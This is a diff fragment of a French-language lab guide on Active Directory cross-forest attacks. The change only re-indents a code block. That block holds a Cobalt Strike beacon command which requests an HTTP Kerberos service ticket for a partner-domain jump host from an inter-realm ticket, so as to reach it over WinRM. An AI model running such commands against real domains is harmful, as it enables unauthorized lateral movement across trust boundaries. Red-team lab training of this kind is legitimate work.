@@ -330,9 +330,9 @@ Dans ce scénario, un compte disposant de droits Domain Admin existe dans CONTOS
 
 5b. **OPSEC-🟠CAUTION** — Demander également un ticket HTTP pour le scénario WinRM.
 
-    ```cs
-    beacon> krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
-    ```
+```cs
+beacon> krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
+```
 
     > WinRM utilise généralement le SPN **`http`**, contrairement aux accès SMB basés sur `cifs`. Dans ce lab, une session dépourvue du ticket adapté peut rencontrer l’erreur `0x8009030e`.
     >
